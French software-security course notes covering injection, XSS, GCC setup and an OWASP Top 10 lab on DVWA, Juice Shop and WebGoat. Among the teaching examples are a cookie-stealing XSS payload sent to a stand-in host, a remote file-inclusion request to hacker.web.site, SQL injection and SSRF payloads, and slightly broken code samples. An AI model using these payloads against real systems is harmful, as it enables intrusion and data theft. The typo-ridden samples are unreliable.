                    <p>Les entrées de test sont peu susceptibles d'inclure des entrées suffisamment volumineuses pour déclencher le débordement.</p>
                    <p>Le safe coding traite toutes les entrées comme dangereuses.</p>
                    <h3>Interprétation des entrées du logiciel :</h3>
                    <p>Les entrées du programme peuvent être binaires ou textuelles. L'interprétation binaire dépend du codage et est généralement spécifique à l'application.</p>
                    <p>Il existe une variété croissante de jeux de caractères utilisés. Il convient de déterminer avec soin quel jeu est utilisé et quels caractères sont lus.</p>
                    <p>Un défaut de validation peut entraîner une vulnérabilité exploitable.</p>
                    <p>Plusieurs vulnérabilités "Improper input validaton" sont recensées.</p>
                    <h3>Attaques par injection :</h3>
                    <p>Ce sont des attaques liées à un traitement incorrect des données d'entrée, en particulier lorsque les données d'entrée du programme peuvent accidentellement ou délibérément influencer le déroulement de l'exécution du programme.</p>
                    <p>Les attaques par injection se produisent le plus souventdans les langages de scripts.</p>
                    <p>Elles sont encouragées par la réutilisation d'autres programmes et utilitaires système lorsque cela est possible, afin de réduire l'effort de codage.</p>
                    <h4>Interaction avec le système GCI (finger : `<span class="em">index.html</span>`) :</h4>
                    <img src="../images/interaction_systeme_GCI.PNG" alt="">
<pre><code>&lt;!DOCTYPE HTML&gt;
&lt;html lang="en"&gt;
    &lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;title&gt;User Info - Finger CGI&lt;/title&gt;
    &lt;style&gt;
        body { font-family: Arial, sans-serif; margin: 2em; background: #f5f5f5; }
        form { background: #fff; padding: 1em; border-radius: 8px; width: 300px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        input[type="text"] { width: 100%; padding: .5em; margin-bottom: 1em; }
        input[type="submit"] { padding: .5em 1em; cursor: pointer; background: #0078D4; color: white; border: none; border-radius: 4px; }
        table { margin-top: 2em; border-collapse: collapse; width: 100%; }
        td, th { border: 1px solid #ccc; padding: .5em; text-align: left; }
    &lt;/style&gt;
    &lt;/head&gt;
    &lt;body&gt;
    &lt;h2&gt;Finger CGI Lookup&lt;/h2&gt;
    &lt;form action="/cgi-bin/finger_info.py" method="get"&gt;
        &lt;label for="user"&gt;Enter username:&lt;/label&gt;
        &lt;input type="text" name="user" id="user" required&gt;
        &lt;input type="submit" value="Get Info"&gt;
    &lt;/form&gt;
    &lt;/body&gt;
&lt;/html&gt;</code></pre>
                    <p>Voici le contenu du fichier `<span class="em">finger_info.py</span>` :</p>
                    <img src="../images/interaction_systeme_GCI_1.PNG" alt="">
<pre><code>#!/usr/bin/env python3
import cgi
import subprocess
import html

print("Content-type: text/html\n")

form = cgi.FieldStorage()
user = form.getfirst("user", "").strip()

print("&lt;html&gt;&lt;head&gt;&lt;title&gt;Finger Result&lt;/title&gt;")
print("&lt;style&gt;body{font-family:Arial;} table{border-collapse:collapse;} td,th{border:1px solid #ccc;padding:4px;}&lt;/style&gt;")
print("&lt;/head&gt;&lt;body&gt;")
print(f"&lt;h2&gt;Finger information for: {html.escape(user)}&lt;/h2&gt;")

if not user:
    print("&lt;p&gt;No username provided.&lt;/p&gt;")
else:
    try:
        # Exécuter finger -l user
        result = subprocess.run(["finger", "-l" user], capture_output=True, text=True, timeout=3)
        output = html.escape(result.stdout.strip())

        if not output:
            print("&lt;p&gt;&lt;b&gt;No information found for this user.&lt;/b&gt;&lt;/p&gt;")
        else:
            print("&lt;pre style='background:#f5f5f5;padding:10px;border-radius:5px;'&gt;" + output + "&lt;/pre&gt;")
    except Exception as e:
        print(f"&lt;p&gt;Error executing finger: {html.escape(str(e))}&lt;/p&gt;")

print("&lt;p&gt;&lt;a href='/index.html'&gt;Back&lt;/a&gt;&lt;/p&gt;")
print("&lt;/body&gt;&lt;/html&gt;")</code></pre>
                    <img src="../images/interaction_systeme_GCI_2.PNG" alt="">
                    <img src="../images/interaction_systeme_GCI_3.PNG" alt="">
                    <h4>Exemple de SQL Injection :</h4>
<pre><code>$name = $_REQUEST['name'];
$query = "SELECT * FROM suppliers WHERE name = '" . $name . "';";
$result = mysql_query($query);</code></pre>
                    <p>Le code ci-dessus est un code PHP vulnérable, alors que le code suivant est un code PHP sûr.</p>
<pre><code>$name = *_REQUEST['name'];
$query = "SELECT * FROM suppliers WHERE name = '" . mysql_real_escape_string($name) . "';";
$result = mysql_query($query);</code></pre>
                    <h4>Exemple d'injection de code :</h4>
<pre><code>&lt;?php
include $path . 'functions.php';
include $path . 'data/prefs.php';
...</code></pre>
                    <p>Ce code est un code PHP vulnérable.</p>
<pre><code>GET /calendar/embed/day.php?path=http://hacker.web.site/hack.txt?&amp;cmd=ls</code></pre>
                    <p>Cela est une attaque HTTP (requête d'exploit).</p>
                    <h3>Attaques de type Cross Site Scripting (XSS) :</h3>
                    <p>Les attaques XSS sont des attaques dans lesquelles les données fournies par un utilisateur sont ensuite transmises à un autre utilisateur.</p>
                    <p>Elles sont fréquentes dans les applications Web scriptées :</p>
                    <ul>
                        <li>
                            <p>La vulnérabilité réside dans l'inclusion de code script dans le contenu HTML.</p>
                        </li>
                        <li>
                            <p>Ce code script peut avoir besoin d'accéder à des données associées à d'autres pages.</p>
                        </li>
                        <li>
                            <p>Les navigateurs imposent des contrôles de sécurité et limitent l'accès aux données aux pages provenant d'un même site.</p>
                        </li>
                    </ul>
                    <p>Cela exploite l'hypothèse selon laquelle tout le contenu d'un site est également fiable et peut donc interagir avecd'autres contenus du site.</p>
                    <p>La vulnérabilité de type reflected XSS est :</p>
                    <ul>
                        <li>
                            <p>L'attaquant inclut le contenu du script malveilant dans les données fournies à un site.</p>
                        </li>
                    </ul>
                    <h4>Exemple de XSS :</h4>
<pre><code>Thanks for this information, its great!
&lt;script&gt;document.location = 'http://example.com/cookie.cgi?' + document.cookie&lt;/script&gt;</code></pre>
                    <p>Ceci est du XSS en clair (plain text).</p>
<pre><code>Thanks for this information, its great!
&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;
&#108;&#111;&#99;&#97;&#116;&#105;&#111;&#110;&#32;&#61;&#32;
&#39;&#104;&#116;&#116;&#112;&#58;&#47;&#47;
&#101;&#120;&#97;&#109;&#112;&#108;&#101;&#46;&#99;&#111;&#109;
&#47;&#99;&#111;&#111;&#107;&#105;&#101;&#46;&#99;&#103;&#105;&#63;&#39;&#32;
&#43;&#32;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;&#59;
&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;</code></pre>
                    <p>Cela est du XSS encodé.</p>
                    <h3>Exercices sur les injections (CGI, SQL, Code, XSS) :</h3>
                    <ul>
                        <li>
                            <p>Pratique !</p>
                        </li>
                        <li>
                            <p>Images web (vulnérable).</p>
                        </li>
                        <li>
                            <p>Introduction OWASP (Open Web Application Security Project).</p>
                        </li>
                    </ul>
                </article>
                <article>
                    <h2 id="gcc">GCC :</h2>
                    <p>Pour utiliser GCC avec MinGW, il faut d'abord installer <a href="https://code.visualstudio.com/download" target="_blank">Visual Studio Code</a> et installer <a href="https://marketplace.visualstudio.com/items?itemName=ms-vscode.cpptools" target="_blank">l'extension C/C++ pour VS Code</a>.</p>
                    <p>Ensuite, vous devez télécharger et installer la dernière version du logiciel <a href="https://www.msys2.org/" target="_blank">MSYS2</a>. Notez que MSYS2 requiert la version 64 bits de Windows 8.1 ou plus récent.</p>
                    <p>Une fois l'installation finie, dans le nouveau terminal, installer la toolchain MinGW-w64 en exécutant la commande suivante :</p>
<pre><code>pacman -S --needed base-devel mingw-w64-ucrt-x86_64-toolchain</code></pre>
                    <p>Il faut accepter la sélection par défaut de paquets et procéder à l'installation.</p>
                    <p>Troisièmement, il faut ajouter le répertoire <span class="em">bin</span> de MinGW-w64 dans la variable d'environnement <span class="em">PATH</span> Windows en ajoutant <span class="em">C:\msys64\ucrt64\bin</span>.</p>
                    <p>Enfin, on doit vérifier que les outils MinGW-w64 sont correctement installés et disponibles avec les commandes suivants dans un nouveau terminal :</p>
<pre><code>gcc --version</code></pre>
                    <p>Le GCC (GNU Compiler Collection) est une suite de compilateurs open source créée par le projet GNU.</p>
                    <p>C'est l'un des outils les plus utiisés pour compiler du code source (langage C, C++, Objective-C, Ada, Fortran, Go, etc.) en binaire exécutable (machine code).</p>
<pre><code>g++ --version</code></pre>
                    <p>g++ est la version C++ du compilateur GCC. En réalité, g++ fait partie de GCC, mais il active automatiquement la compilation C++ et le linkage des bibliothèques standard C++ (libstdc++).</p>
<pre><code>gdb --version</code></pre>
                    <p>Le GDB (GNu Debugger) est un débogueur utilisé pour analyser, corriger, et comprendrel'exécution d'un programme C ou C++.</p>
                    <p>Voici les différentes fonctionnalités à l'intérieur de GDB :</p>
                    <table class="tableBalises">
                        <thead>
                            <tr>
                                <th>Commandes</th>
                                <th>Explications</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td class="em">break main</td>
                                <td>Met un point d'arrêt à main()</td>
                            </tr>
                            <tr>
                                <td class="em">run</td>
                                <td>Lance le programme</td>
                            </tr>
                            <tr>
                                <td class="em">step</td>
                                <td>Avance une instruction</td>
                            </tr>
                            <tr>
                                <td class="em">print variable</td>
                                <td>Affiche la valeur d'une variable</td>
                            </tr>
                            <tr>
                                <td class="em">continue</td>
                                <td>Continue jusqu'au prochain breakpoint</td>
                            </tr>
                            <tr>
                                <td class="em">quit</td>
                                <td>Quitte</td>
                            </tr>
                        </tbody>
                    </table>
                    <p>Pour accéder à l'aide de GCC, il y a plusieurs méthodes possibles :</p>
                    <ul>
                        <li>
<pre><code>man gcc</code></pre>
                            <p>C'est la vraie documentation complète (le "manuel Unix"). Mais elle est trop longue et détaillée, souvent trop verbeuse pour un usage rapide.</p>
                            <p>Il faut avoir les pages de manuel installées (<span class="em">sudo apt install manpages-dev</span> sur Debian/Ubuntu par exemple).</p>
                        </li>
                        <li>
<pre><code>gcc --help</code></pre>
                            <p>Cette commande affiche les options les plus courantes, divisées par sections (linking, warnings, optimization...).</p>
                            <p>C'est beaucoup plus lisible que <span class="em">man gcc</span> pour un usage rapide.</p>
                        </li>
                        <li>
<pre><code>gcc -Q --help=optimizers</code></pre>
                            <p>Cette commande liste toutes les optimisations possibles (activées ou non selon ton niveau <span class="em">-o</span>).</p>
                        </li>
                        <li>
<pre><code>info gcc</code></pre>
                            <p>Cette commande ouvre la documentation GNU "info", structurée et plus navigable que <span class="em">man</span>.</p>
                        </li>
                    </ul>
                    <p>Les principales options de GCC lors d'une compilation basique sont :</p>
                    <table class="tableBalises">
                        <thead>
                            <tr>
                                <th>Option</th>
                                <th>Description</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td class="em">-c</td>
                                <td>Compile uniquement en fichier objet (.o), sans édition de liens</td>
                            </tr>
                            <tr>
                                <td class="em">-o &lt;fichier&gt;</td>
                                <td>Spécifie le nom de sortie</td>
                            </tr>
                            <tr>
                                <td class="em">-g</td>
                                <td>Génère les symboles de débogage (pour gdb, valgrind, etc.)</td>
                            </tr>
                            <tr>
                                <td class="em">-Wall</td>
                                <td>Active un grand nombre d'avertissements</td>
                            </tr>
                            <tr>
                                <td class="em">-Wextra</td>
                                <td>Active encore plus d'avertissements</td>
                            </tr>
                            <tr>
                                <td class="em">-std=c11</td>
                                <td>Force une norme précise du langage C</td>
                            </tr>
                            <tr>
                                <td class="em">-pedantic</td>
                                <td>Vérifie le respect strict de la norme</td>
                            </tr>
                        </tbody>
                    </table>
                    <p>Les options d'optimisation <span class="em">-O</span> sont :</p>
                    <table class="tableBalises">
                        <thead>
                            <tr>
                                <th>Option</th>
                                <th>Description</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td><span class="em">-O0</span> (lettre O + chiffre zéro)</td>
                                <td>
                                    <p>Aucune optimisation.</p>
                                    <p>&#8594; Chaque instruction du code C correspond presque directement à une instruction machine.</p>
                                    <p>&#10003; Idéal pour le débogage.</p>
                                </td>
                            </tr>
                            <tr>
                                <td class="em">-O1</td>
                                <td>Optimisations légères (élimine du code inutile, réduit les sauts inutiles).</td>
                            </tr>
                            <tr>
                                <td class="em">-O2</td>
                                <td>
                                    <p>Optimisations plus poussées mais sûres.</p>
                                    <p>&#8594; Par défaut pour la plupart des compilations standards.</p>
                                </td>
                            </tr>
                            <tr>
                                <td class="em">-O3</td>
                                <td>
                                    <p>Optimisations agressives (déroulage de boucles, inlining forcé, etc.).</p>
                                    <p>&#9888; Peut rendre le débogage plus difficile.</p>
                                </td>
                            </tr>
                            <tr>
                                <td class="em">-Os</td>
                                <td>Optimise pour la taille du binaire plutôt que la vitesse.</td>
                            </tr>
                            <tr>
                                <td class="em">-Ofast</td>
                                <td>
                                    <p>Active <span class="em">-O3</span> + certaines optimisations non standards (peut ignorer des règles IEEE sur les floats).</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </article>
                <article>
                    <h2 id="OWASP_Top10_Lab_Setup">OWASP TOP 10 Lab Setup :</h2>
                    <h3>Objectif :</h3>
                    <p>Mettre en place un <span class="em">laboratoire pratique</span> pour comprendre, exploiter et corriger les vulnérabilités les plus courantes selon <a href="https://owasp.org/Top10/2021/A00_2021_Introduction/index.html" target="_blank">l'OWASP Top 10</a>.</p>
                    <h3>Prérequis :</h3>
                    <p>Outils nécessaires :</p>
                    <ul>
                        <li>
                            <p><span class="em">OS</span> : Linux / Mac OS / Windows WSL2</p>
                        </li>
                        <li>
                            <p><span class="em">Docker</span> et <span class="em">Docker Compose</span></p>
                        </li>
                        <li>
                            <p><span class="em">Navigateur</span> : Firefox / Chrome</p>
                        </li>
                        <li>
                            <p><span class="em">Éditeur</span> : VSCode ou PyCharm</p>
                        </li>
                        <li>
                            <p>(Optionnel) <span class="em">Burp Suite Community Edition</span></p>
                        </li>
                    </ul>
                    <h3>Architecture du Lab :</h3>
                    <p>Chaque vulnérabilité est isolée dans un container ou un dossier distinct.</p>
                    <img src="../images/architecture_owasp_lab.PNG" alt="">
                    <h3>Environements vulnérables:</h3>
                    <ol>
                        <li>
                            <h4>DVWA - Damn Vulnerable Web Application :</h4>
                            <ul>
                                <li>
                                    <p><span class="em">Cible</span> : Injection SQL, XSS, File Upload, CSRF, etc.</p>
                                </li>
                                <li>
                                    <p><span class="em">URL</span> : http://localhost:8080</p>
                                </li>
                                <li>
                                    <p><span class="em">Docker run</span> :</p>
<pre><code>docker run -d -p 8080:80 --name dvwa vulnerables/web-dvwa</code></pre>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>OWASP Juice Shop :</h4>
                            <ul>
                                <li>
                                    <p><span class="em">Cible</span> : Broken Auth, Sensitive Data Exposure, Injection, etc.</p>
                                </li>
                                <li>
                                    <p><span class="em">URL</span> : http://localhost:3000</p>
                                </li>
                                <li>
                                    <p><span class="em">Docker run</span> :</p>
<pre><code>docker run -d -p 3000:3000 --name juice-shop bkimminich/juice-shop</code></pre>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>WebGoat + WebWolf :</h4>
                            <ul>
                                <li>
                                    <p><span class="em">Cible</span> : Advanced OWASP lessons (Java, API, Auth, Crypto)</p>
                                </li>
                                <li>
                                    <p><span class="em">URL</span> : http://localhost:8081/WebGoat</p>
                                </li>
                                <li>
                                    <p><span class="em">Docker run</span> :</p>
<pre><code>docker run -d -p 8081:8080 --name webgoat webgoat/webgoat</code></pre>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>Multillidae II :</h4>
                            <ul>
                                <li>
                                    <p><span class="em">Cible</span> : OWASP Top 10 complet + API + vulnérabilités business logic</p>
                                </li>
                                <li>
                                    <p><span class="em">URL</span> : http://localhost:8090</p>
                                </li>
                                <li>
                                    <p><span class="em">Docker run</span> :</p>
<pre><code>docker run -d -p 8090:80 --name multillidae citizenstig/nowasp</code></pre>
                                </li>
                            </ul>
                        </li>
                    </ol>
                    <h3>Docker Compose simplifié :</h3>
                    <p>Crée un fichier <span class="em">docker-compose.yml</span> :</p>
<pre><code>version: '3'
services:
  dvwa:
    image: vulnerables/web-dvwa
    ports:
        - "8080:80"
  juice-shop:
    image: bkimminich/juice-shop
    ports:
        - "3000:3000"
  webgoat:
    image: webgoat/webgoat
    ports:
        - "8081:8080"
  mutillidae:
    image: citizenstig/nowasp
    ports:
        - "8090:80"</code></pre>
                    <p>Lancer :</p>
<pre><code>docker compose up -d</code></pre>
                    <p>Cette commande permet de <span class="em">démarrer une application multi-conteneurs Docker</span> définie dans un fichier de configuration appelé <span class="em">docker-compose.yml</span>.</p>
                    <p>L'option <span class="em">up</span> permet de :</p>
                    <ul>
                        <li>
                            <p>Créer les conteneurs si nécessaire</p>
                        </li>
                        <li>
                            <p>Télécharger les images si elles n'existent pas localement</p>
                        </li>
                        <li>
                            <p>Créer les réseaux Docker</p>
                        </li>
                        <li>
                            <p>Monter les volumes</p>
                        </li>
                        <li>
                            <p>Démarrer tous les services définis dans le fichier <span class="em">docker-compose.yml</span></p>
                        </li>
                    </ul>
                    <h3>Schénarios de pratiques OWASP Top 10 :</h3>
                    <table class="tableBalises">
                        <thead>
                            <tr>
                                <th>OWASP Top 10</th>
                                <th>Application</th>
                                <th>Exemple d'exercice</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td>A01 - Broken Access Control</td>
                                <td>Juice Shop</td>
                                <td>Accès à un profil admin via IDOR</td>
                            </tr>
                            <tr>
                                <td>A02 - Cryptographic Failures</td>
                                <td>WebGoat</td>
                                <td>Mauvais stockage de mot de passe</td>
                            </tr>
                            <tr>
                                <td>A03 - Injection</td>
                                <td>DVWA</td>
                                <td>Injection SQL et Command Injection</td>
                            </tr>
                            <tr>
                                <td>A04 - Insecure Design</td>
                                <td>Mutillidae</td>
                                <td>Mauvaise logique d'authentification</td>
                            </tr>
                            <tr>
                                <td>A05 - Security Misconfiguration</td>
                                <td>DVWA</td>
                                <td>Exposition des pages d'admin</td>
                            </tr>
                            <tr>
                                <td>A06 - Vulnerable & Outdated Components</td>
                                <td>WebGoat</td>
                                <td>Exploitation de dépendances</td>
                            </tr>
                            <tr>
                                <td>A07 - Identification & Auth Failures</td>
                                <td>Juice Shop</td>
                                <td>Session hijacking</td>
                            </tr>
                            <tr>
                                <td>A08 - Software & Data Integrity Failures</td>
                                <td>WebGoat</td>
                                <td>Manipulation de code signé</td>
                            </tr>
                            <tr>
                                <td>A09 - Logging & Monitoring Failures</td>
                                <td>Mutillidae</td>
                                <td>Attaques non détectées</td>
                            </tr>
                            <tr>
                                <td>A10 - SSRF</td>
                                <td>Juice Shop / DVWA</td>
                                <td>Accès à ressource interne</td>
                            </tr>
                        </tbody>
                    </table>
                    <h3>Documentation pour les étudiants :</h3>
                    <p><span class="em">GUIDE.md</span> (avec toutes les sections) :</p>
<pre><code># OWASP Top 10 - Lab d'Exercices (JuiceShop, DVWA, WebGoat)

Ce document fournit un ensemble d'exercices pratiques couvrant chaque catégorie de l’**OWASP Top 10**, basés sur trois plateformes vulnérables : **OWASP Juice Shop**, **DVWA** et **OWASP WebGoat**.
Chaque exercice inclut :
- Objectif
- Étapes à réaliser
- Correction / Payloads

---

# Pré-requis

## Plateformes utilisées
- **OWASP Juice Shop** : <a href="https://owasp.org/www-project-juice-shop/" target="_blank">https://owasp.org/www-project-juice-shop/</a>
- **DVWA** (Damn Vulnerable Web App)
- **WebGoat** : <a href="https://owasp.org/www-project-webgoat/" target="_blank">https://owasp.org/www-project-webgoat/</a>

## Outils recommandés
- Burp Suite Community
- Browser DevTools
- Hydra / wfuzz / curl
- Hashcat / John The Ripper
- Docker (optionnel)

---

# A01 - Broken Access Control

## Exercice 1 - Juice Shop : Accéder au profil d'un autre utilisateur
**Objectif :** Tester une IDOR (Insecure Direct Object Reference)

### Étapes
1. Se connecter avec un compte normal.
2. Ouvrir DevTools &#8594; onglet Network.
3. Observer la requête : `/rest/user/whoami`.
4. Modifier l'ID utilisateur dans la requête.

### Correction
```
GET /rest/user/1
```
Renvoie le profil admin → contrôle d'accès cassé.

---

## Exercice 2 - DVWA : IDOR via paramètre GET
**Objectif :** Manipuler un paramètre non protégé.

### Payload
```
http://dvwa/vulnerabilities/view_profile.php?user_id=3
```
&#8594; Accès direct au profil.

---

# A02 - Cryptographic Failures

## WebGoat - Crack de hash MD5
**Objectif :** Comprendre faiblesse des algorithmes dépréciés.

### Étapes
1. Dans *Hashing &#8594; Password Cracking*, récupérer le hash.
2. Utiliser Hashcat ou CrackStation.

### Correction
```
5f4dcc3b5aa765d61d8327deb882cf99 &#8594; password
```

---

# A03 - Injection

## Exercice 1 - DVWA SQL Injection (Low)
**Objectif :** Contourner une requête SQL vulnérable.

### Payload
```
' OR 1 = 1 --
```
&#8594; Affiche tous les utilisateurs.

---

## Exercice 2 - Juice Shop : Bypass Login
### Payload
```
' OR 1 = 1 --
```
&#8594; Connexion admin.

---

## Exercice 3 - WebGoat SQL Injection Avancée
### Payload
```
' UNION SELECT null, cc_number, null, null FROM creditcard --
```
&#8594; Exfiltration du numéro de carte.

---

# A04 - Insecure Design

## WebGoat - Manipulation de logique applicative
**Objectif :** Modifier un prix côté client.

### Étapes
1. Ouvrir DevTools.
2. Modifier un champ prix :
```html
&lt;input type="number" value="-99"&gt;
```
3. Soumettre la commande.

### Résultat
Achat validé &#8594; absence de validation serveur.

---

# A05 - Security Misconfiguration

## DVWA - Accès à phpinfo()
**Objectif :** Détecter exposition d'informations sensibles.

### Étapes
Accéder :
```
http://dvwa/phpinfo.php
```

### Risques
- Version PHP
- Modules actifs
- Chemins système

---

# A06 - Vulnerable & Outdated Components

## Juice Shop - Packages obsolètes accessibles
**Objectif :** Identifier composants vulnérables.

### Étapes
Accéder au fichier exposé :
```
/ftp/package.json.bak
```

&#8594; Liste de dépendances vulnérables &#8594; flag.

---

# A07 - Identification & Authentication Failures

## Juice Shop - Bruteforce du compte admin
### Info utile
```
admin@juice-sh.op
```

### Action
Lancer une attaque Hydra / Burp Intruder.

### Résultat
Mot de passe faible :
```
admin123
```
&#8594; Connexion admin.

---

# A08 - Software & Data Integrity Failures

## WebGoat - Upload malveillant
### Étapes
1. Upload `shell.php.jpg`.
2. Intercepter avec Burp.
3. Modifier Content-Type en `image/jpeg`.

### Résultat
L'exécution du code serveur est acceptée.

---

# A09 - Security Logging & Monitoring Failures

## Juice Shop - Détection XSS dans logs
### Étapes
Accéder à :
```
/support/logs
```

### Résultat
Entrée log visible :
```
&lt;script&gt;alert(1)&lt;/script&gt;
```
&#8594; Attaque non filtrée.

---

# A10 - SSRF

## WebGoat - Lecture de fichiers internes
### Payload
```
http://localhost:8080/WebGoat/attack?url=file:///etc/passwd
```
&#8594; SSRF réussie.

---</code></pre>
                </article>
                <article>
                    <h2 id="travaux_individuels_OWAP_Top_10">Travaux individuels - OWASP Top 10 (2021) : Analyse de vulnérabilités et contre-mesures applicatives :</h2>
                    <ol>
                        <li>
                            <h3>Contexte :</h3>
                            <p>Dans le cadre du cours de Software Security, chaque étudiant a sélectionné trois catégories de vulnérabilités issues de l'OWASP Top 10 (2021).</p>
                        </li>
                        <li>
                            <h3>Organisation du travail :</h3>
                            <p>Pour chaque catégorie OWASP choisie, l'étudiant doit remettre un rapport distinct. Trois rapports sont donc attendus par étudiant.</p>
                        </li>
                        <li>
                            <h3>Structure obligatoire de chaque rapport :</h3>
                            <ol>
                                <li>
                                    <p><span class="em">Présentation de la vulnérabilité</span> : Définition, principe, erreurs de développement associées, composants concernés.</p>
                                </li>
                                <li>
                                    <p><span class="em">Scénario(s) d'exploitation</span> : Scénarios réalistes, hypothèses techniques, étapes générales.</p>
                                </li>
                                <li>
                                    <p><span class="em">Causes racines</span> : Analyse des causes techniques (conception, implémentation, contrôles absents).</p>
                                </li>
                            </ol>
                        </li>
                        <li>
                            <h3>Impacts de sécurité :</h3>
                            <p>Confidentialité, intégrité, disponibilité.</p>
                        </li>
                        <li>
                            <h3>Contre-mesures logicielles :</h3>
                            <ul>
                                <li>
                                    <p>Niveau code</p>
                                </li>
                                <li>
                                    <p>Niveau architecture applicative</p>
                                </li>
                                <li>
                                    <p>Préventives et détectives</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h3>Limites et risques résiduels :</h3>
                            <p>Une contre-mesure a des limites ? Certaines attaques restent possibles ?</p>
                            <p>La sécurité applicative repose sur des <span class="em">compromis</span>.</p>
                        </li>
                        <li>
                            <h3>Format attendu :</h3>
                            <p>Un rapport PDF par catégorie.</p>
                        </li>
                        <li>
                            <h3>Critères d'évaluation :</h3>
                            <p>Compréhension (30%), analyse (25%), contre-mesures (35%), clarté (10%).</p>
                        </li>
                        <li>
                            <h3>Consignes :</h3>
                            <p>Travail original, copier-coller interdit.</p>
                        </li>
                    </ol>
                    <h3>A1 - Broken Access Control :</h3>
                    <ol>
                        <li>
                            <h4>Présentation de la vulnérabilité :</h4>
                            <p>Le <span class="em">Broken Access Control</span> désigne une mauvaise implémentation des mécanismes de contrôle d'accès dans une application.</p>
                            <p>Il se produit lorsque les restrictions définissant <span class="em">quels utilisateurs peuvent accéder à quelles ressources ou fonctionnalités</span> ne sont pas correctement appliquées côté serveur.</p>
                            <p>Cette vulnérabilité permet à un attaquant d'accéder à des données sensibles, de modifier des ressources ou d'exécuter des actions réservées à d'autres utilisateurs ou à des administrateurs.</p>
                            <p>Les erreurs de développement courantes incluent :</p>
                            <ul>
                                <li>
                                    <p>Absence de vérification des autorisations côté serveur.</p>
                                </li>
                                <li>
                                    <p>Confiance excessive dans les contrôles côté client.</p>
                                </li>
                                <li>
                                    <p>Mauvaise gestion des rôles et permissions.</p>
                                </li>
                                <li>
                                    <p>Exposition d'identifiants directs d'objets (IDOR).</p>
                                </li>
                            </ul>
                            <p>Les composants concernés sont principalement les API backend, les contrôleurs applicatifs et la couche d'accès aux données.</p>
                        </li>
                        <li>
                            <h4>Scénario(s) d'exploitation :</h4>
                            <h5>Scénario : Accès non autorisé aux données d'un autre utilisateur :</h5>
                            <h6>Hypothèses techniques :</h6>
                            <p>L'application permet l'accès aux profils utilisateurs via un paramètre <span class="em">userId</span> transmis dans l'URL sans vérification d'autorisation.</p>
                            <h6>Étapes générales :</h6>
                            <ol>
                                <li>
                                    <p>Un utilisateur authentifié accède à son profil personnel.</p>
                                </li>
                                <li>
                                    <p>L'URL affichée est <span class="em">/profile?userId=120</span>.</p>
                                </li>
                                <li>
                                    <p>L'utilisateur modifie manuellement la valeur du paramètre : <span class="em">/profile?userId=121</span>.</p>
                                </li>
                                <li>
                                    <p>Le serveur retourne les données de l'utilisateur 121 sans contrôle supplémentaire.</p>
                                </li>
                            </ol>
                            <p>Ce scénario illustre une vulnérabilité de type <span class="em">IDOR (Insecure Direct Object Reference)</span>.</p>
                        </li>
                        <li>
                            <h4>Causes racines :</h4>
                            <p>Les causes racines du Broken Access Control sont principalement :</p>
                            <ul>
                                <li>
                                    <p>Une conception applicative qui ne considère pas la sécurité comme une exigence fondamentale.</p>
                                </li>
                                <li>
                                    <p>L'absence de contrôles d'autorisation systématiques pour chaque requête.</p>
                                </li>
                                <li>
                                    <p>Une logique de sécurité dispersée et non centralisée.</p>
                                </li>
                                <li>
                                    <p>Un manque de tests de sécurité et de revues de code orientées autorisation.</p>
                                </li>
                            </ul>
                            <p>Il s'agit généralement d'un problème de <span class="em">conception et d'architecture</span>, plus que d'une simple erreur de syntaxe.</p>
                        </li>
                        <li>
                            <h4>Impacts de sécurité :</h4>
                            <ul>
                                <li>
                                    <p><span class="em">Confidentialité</span> : accès non autorisé à des données personnelles ou sensibles.</p>
                                </li>
                                <li>
                                    <p><span class="em">Intégrité</span> : modification ou suppression de données sans permission.</p>
                                </li>
                                <li>
                                    <p><span class="em">Disponibilité</span> : possibilité de bloquer ou supprimer des ressources critiques.</p>
                                </li>
                            </ul>
                            <p>L'impact global est considéré comme <span class="em">élevé</span>, car l'exploitation est souvent simple et les conséquences sévères.</p>
                        </li>
                        <li>
                            <h4>Contre-mesures logicielles :</h4>
                            <ol>
                                <li>
                                    <h5>Niveau code :</h5>
                                    <ul>
                                        <li>
                                            <p>Vérifier les autorisations pour chaque requête côté serveur.</p>
                                        </li>
                                        <li>
                                            <p>Associer explicitement les ressources à l'identité de l'utilisateur authentifié.</p>
                                        </li>
                                        <li>
                                            <p>Ne jamais faire confiance aux paramètres fournis par le client.</p>
                                        </li>
                                        <li>
                                            <p>Utiliser des frameworks ou annotations de contrôle d'accès.</p>
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    <h5>Niveau architecture applicative :</h5>
                                    <ul>
                                        <li>
                                            <p>Implémenter un modèle RBAC (Role-Based Access Control).</p>
                                        </li>
                                        <li>
                                            <p>Centraliser la gestion des permissions.</p>
                                        </li>
                                        <li>
                                            <p>Séparer clairement les fonctions utilisateur et administrateur.</p>
                                        </li>
                                        <li>
                                            <p>Appliquer le principe du moindre privilège.</p>
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    <h5>Mesures préventives et détectives :</h5>
                                    <ul>
                                        <li>
                                            <p><span class="em">Préventives</span> : contrôles d'accès stricts, tests automatisés.</p>
                                        </li>
                                        <li>
                                            <p><span class="em">Détectives</span> : journalisation des accès, alertes en cas de comportement anormal.</p>
                                        </li>
                                    </ul>
                                </li>
                            </ol>
                        </li>
                        <li>
                            <h4>Limites et risques résiduels :</h4>
                            <p>Malgré la mise en place de contre-mesures efficaces :</p>
                            <ul>
                                <li>
                                    <p>Des erreurs de configuration peuvent subsister.</p>
                                </li>
                                <li>
                                    <p>Les évolutions fonctionnelles peuvent introduire de nouvelles failles.</p>
                                </li>
                                <li>
                                    <p>Les erreurs humaines restent possibles.</p>
                                </li>
                            </ul>
